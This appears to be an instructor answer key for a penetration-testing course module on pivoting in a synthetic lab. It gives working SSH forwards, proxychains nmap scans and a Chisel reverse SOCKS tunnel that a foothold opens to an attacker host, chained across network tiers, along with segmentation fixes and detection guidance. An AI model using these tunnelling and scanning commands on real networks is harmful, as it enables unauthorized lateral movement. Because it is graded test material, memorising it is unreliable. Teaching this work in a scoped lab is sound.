# Instructor / solutions — Module 12 (Pivoting &amp; complex networks)

> **Instructor material. Not linked from `_sidebar.md`.** Do the exercises before reading.

These answers assume the `lab-12-pivot` topology as specified: attack box → dual-homed **DMZ** host
(`10.10.0.5`, `eth0` on the shared DMZ range, `eth1` on `172.16.20.0/24`) → **internal**
(`172.16.20.0/24`) → **restricted** (`192.168.50.0/24`), each boundary a stateful firewall, synthetic
`lab:Lab-Passw0rd!` credentials, and `LAB-FLAG-{uuid}` markers on an internal service and a restricted
service. Exact host addresses/ports vary with the built lab; **grade on reasoning and mechanism**
(the *which-side-initiates* logic, the SOCKS/TCP-only limits, the segmentation analysis), not on
matching a specific command. The two overarching non-negotiables: (a) every tunnel is explained by
*who initiates and one-vs-many destinations*, and (b) scope is re-checked at every boundary — a pivot
is capability, never authorization.

---

## 12.1 — Port forwarding &amp; tunnelling

**Exercise (reach the internal panel + scan the /24, justified).** Full credit needs the right
forward type for each task, the two-question justification, verification evidence, and the direction
argument. Model answer:

- **Task A — browse the admin panel at `172.16.20.30:8080`.** One known destination, and you can SSH
  *to* the pivot (initiate inward) → **local forward**:
  `ssh -f -N -L 8080:172.16.20.30:8080 lab@10.10.0.5`, then browse `http://127.0.0.1:8080/`.
  Two-question justification: *who initiates?* you do, into the pivot's network (SSH-to-pivot is
  allowed). *One or many?* one fixed `DEST:DPORT` → `-L`, not `-D`. `-R` is wrong because you don't
  need the far side to initiate. Evidence: `ss -tnlp` shows the `:8080` listener; the panel's
  content/`LAB-FLAG-{uuid}` returns.
- **Task B — nmap the internal `/24`.** Destination unknown (a whole range) → **dynamic forward**:
  `ssh -f -N -D 1080 lab@10.10.0.5`, `proxychains.conf` with `socks5 127.0.0.1 1080` + `proxy_dns`,
  then `proxychains nmap -sT -Pn -n --top-ports 20 172.16.20.0/24`. Justification: *many*
  destinations chosen per connection → `-D`; `-L` would pin a single host, useless for a sweep.
  **`-sT -Pn` mandatory:** SOCKS carries only established TCP `connect()`s, so `-sS` (raw SYN) and
  ICMP host-discovery produce nothing; `-sT` uses full connects proxychains can hook, `-Pn` skips the
  unroutable ping.
- **Direction sentence:** the firewall allows *you → pivot* (SSH) and drops other inbound-to-DMZ, so
  you can initiate *into* the pivot's network; that permits `-L`/`-D` and makes a reverse tunnel
  unnecessary here (tie to 01.3's stateful rule).

Docking: choosing `-D` for the single panel (works, but doesn't show the one-vs-many reasoning) is a
minor deduction; choosing `-L` for the scan is wrong (can't sweep). No mechanism / no evidence /
missing `-sT -Pn` explanation → partial. Scanning outside `172.16.20.0/24` "because the tunnel let
me" → professionalism failure.

**Check-yourself.**
1. **Local (`-L`) and dynamic (`-D`) still work; remote (`-R`) is impossible.** `-L`/`-D` require only
   that *you* initiate toward the pivot (which you can — you SSH to it) and that the pivot initiate
   onward into its own network. `-R` needs the pivot's side to open connections back to your machine;
   if the pivot's network cannot initiate to you, the remote listener has nothing to relay. It's the
   *who-initiates* axis: `-R`'s data path runs pivot-side → you.
2. **`-sS` (raw SYN) can't traverse SOCKS.** SOCKS proxies established TCP connections via
   `connect()`; a raw SYN scan crafts packets on a raw socket that proxychains' libc hook never sees,
   so nothing is forwarded → zero results. The `-L` forward works because it, too, is an ordinary
   TCP connect. Fix: `proxychains nmap -sT -Pn -n ...` (full-connect scan, skip ping).
3. **Local forward to the pivot's loopback:** `ssh -L 5432:127.0.0.1:5432 lab@10.10.0.5`, then
   connect to `127.0.0.1:5432` on your box. It works because the *pivot* makes the onward connection
   to `127.0.0.1:5432` **from the pivot itself** — so the DB sees a loopback client, which is exactly
   what it permits. Your traffic arrives inside the pivot as local traffic; the "only localhost" bind
   is not a network control against someone already on the host.
4. **`proxy_dns` routes name resolution through the proxy (the pivot's resolver).** Without it,
   proxychains resolves `db.corp.lab` **locally** on your attack box, which either can't reach the
   internal DNS (lookup fails, tool errors) or leaks the internal hostname to your local/again
   external resolver — an OPSEC and correctness problem. With it, the pivot resolves the name as an
   internal client would, so internal-only names work and nothing leaks.
5. **Reverse forward — `ssh -R` (or, when there's no SSH, a Chisel reverse tunnel, 12.2).** It
   requires the foothold to be able to **initiate an outbound connection to you** (egress the firewall
   allows, e.g. 443) and, for `ssh -R`, an SSH client/route from the pivot to your box. The pivot
   connects out; you push a listener/proxy back down that session. This is precisely the 12.2 setup.

---

## 12.2 — Reverse tunnels, multi-hop &amp; segmentation

**Exercise (DMZ → internal → restricted, route not given, report-ready).** Full credit requires: a
reverse tunnel at hop 1 with the direction argument, a *chained* second hop, discovery of the
restricted segment from the internal host's own artifacts (not a lucky blind scan), per-hop evidence,
and a real segmentation analysis. Model path:

- **Hop 1 (reverse, because inbound-to-DMZ is fully blocked).** `chisel server -p 8000 --reverse
  --auth lab:Lab-Passw0rd!` on the attack box; `chisel client --auth ... ATTACKER:8000 R:socks` on the
  DMZ foothold → reverse SOCKS on `attacker:1080`. Direction argument: you cannot initiate toward the
  DMZ at all (so `-L` and even `-R`-via-SSH-to-pivot are out), but the DMZ host *can* reach you on
  443/8000; the firewall permits that outbound connection and its replies, and the tunnel rides
  inside it. Discover the internal range: `proxychains nmap -sT -Pn -n --top-ports 20
  172.16.20.0/24`; reach the internal panel → first `LAB-FLAG-{uuid}`.
- **Discovering the restricted segment without the route.** On the compromised internal host
  (`172.16.20.30`), read `ip route` / `arp -a` (a `192.168.50.0/24` neighbour or route), `/etc/hosts`
  and app configs (`db.restricted.lab` / `192.168.50.10`), and `ss -tnp` (an *established* connection
  to the restricted host proves the path is allowed and names the port). This is why blind two-proxy
  scanning is insufficient — it's slow, TCP-only, and can't ping; the host's own artifacts hand you
  the exact target and confirm reachability.
- **Hop 2 (chain).** Land Chisel on `172.16.20.30` (through hop 1), `... R:1081:socks` → second
  reverse SOCKS on `attacker:1081`; add `socks5 127.0.0.1 1081` under `strict_chain` in
  `proxychains.conf`. Narrow proxied scan of the *named* restricted host/port
  (`proxychains nmap -sT -Pn -n -p <port> 192.168.50.10`), then reach it → restricted
  `LAB-FLAG-{uuid}`. **Prove** it's unreachable through hop 1 alone (fails without the 1081 hop),
  confirming the second boundary is real.
- **Topology + segmentation analysis.** Diagram: attack box reaches DMZ only; DMZ reaches internal;
  internal reaches restricted — three tiers, two boundaries. Too-permissive rules: (a) **DMZ egress**
  allowed arbitrary outbound to the attacker (enabled the reverse tunnel) — should be deny-by-default
  egress; (b) **DMZ→internal** allowed broad access rather than one endpoint; (c)
  **internal→restricted** trusted any internal source rather than a specific host/port. Single most
  impactful fix: deny-by-default egress from the DMZ (kills the reverse tunnel outright); then
  endpoint-scoped inter-tier rules. Detection: DMZ host initiating long-lived outbound 443
  (T1090.002/T1572), east-west scan/connect anomalies (T1046/T1090.001), Chisel binary + web-account
  spawning a network client.

Docking: using `ssh -L`/`-R` at hop 1 (ignores that inbound is fully blocked); blind-scanning two
proxies deep instead of reading the internal host's artifacts; no proof that hop-2's target fails
through hop 1 alone (doesn't demonstrate the boundary); a "we got a shell" writeup with no per-boundary
rule analysis; crossing into a segment/host outside the three in-scope ranges because the tunnel
allowed it (professionalism failure — scope is re-checked per boundary).

**Check-yourself.**
1. A stateful firewall permits **replies to connections initiated on its trusted side** and drops
   unsolicited inbound. `ssh -L` needs *you* to reach *in* to the DMZ (blocked); `ssh -R` needs you to
   SSH *to* the pivot first (also inbound, blocked). A Chisel reverse tunnel makes the **DMZ host
   initiate outbound** to you on allowed 443; the firewall treats it as permitted egress plus its
   replies, and your proxy traffic rides inside that pivot-initiated session — the one direction the
   firewall trusts.
2. It means `192.168.50.10` is behind a **second boundary** that only the internal segment (not the
   DMZ pivot's SOCKS egress) can cross — a distinct tier. Next: get a foothold / land a tunnel client
   on an **internal** host that *can* reach it and **chain a second SOCKS hop** (proxychains
   `strict_chain` with the internal host's proxy), then reach the restricted target through both hops.
3. Every connection is relayed and re-initiated at each SOCKS hop, so latency stacks and any timeout
   or drop on either tunnel fails the probe; TCP-only, no parallel raw scanning, and no host discovery
   compound it. Methodology fix: **don't blind-scan** — read the near foothold's ARP/routes/hosts/
   configs/established connections to identify the exact restricted hosts and ports, then run a
   *narrow* `-sT` scan of just those, minimizing probes across the slow chain.
4. SOCKS proxies (both `ssh -D` and Chisel `socks`) carry only **established TCP connections** made
   through `connect()`; ICMP echo and raw-socket SYN scans use packet types/sockets the proxy and
   proxychains' libc hook never forward, so they silently yield nothing. Instead you **infer liveness
   from successful TCP connects** (`-sT -Pn` to common ports) — an open/closed response means the host
   is up — and supplement with the far host's ARP table and configs.
5. *"From a DMZ web-server foothold we reached the restricted-tier database via a single internal
   host, capturing `LAB-FLAG-{uuid}`. The DMZ's unrestricted outbound access and the broad
   DMZ→internal and internal→restricted firewall rules — rather than endpoint-scoped allow-lists —
   made the tiered segmentation traversable. Highest-impact fix: deny-by-default egress from the DMZ
   and restrict each inter-tier rule to the specific host/port required."* (Any answer naming the
   failed *controls* and a segmentation/egress remediation, not the shell, earns credit.)

---

## Grading notes (both lessons)

- **Every tunnel choice must be justified by mechanism** — the two questions (*which side initiates?
  one destination or many?*). "It worked" without that reasoning is a partial answer; the point of
  M12 is choosing the right primitive for an unseen topology.
- **The SOCKS/TCP-only limit is load-bearing.** A student who can't explain why `-sT -Pn` is
  mandatory through a proxy, or who runs `-sS`/ICMP through SOCKS and reports "no hosts," has missed
  the core constraint.
- **Discovery through a pivot is not just scanning.** Reward reading the far foothold's own artifacts
  (ARP, routes, hosts, established connections, configs) to target narrowly; penalize blind multi-hop
  sweeps as the primary method.
- **Segmentation analysis is the deliverable.** A report-ready answer names *which* inter-tier/egress
  rules were too permissive and gives remediation + ATT&CK-mapped detection — not "we pivoted to the
  DB." Missing the segmentation analysis is missing the finding.
- **Verification per hop.** Each boundary crossed needs its own evidence (listener shown, flag
  captured, and — for later hops — proof the target is unreachable via earlier hops alone).
- **Safety / scope.** Any submission that pivots outside the in-scope ranges because the tunnel made
  it possible, or omits the LAB-vs-REAL boundary, fails the professionalism bar (M00). Scope is
  re-checked at *every* boundary; a pivot is capability, not authorization.
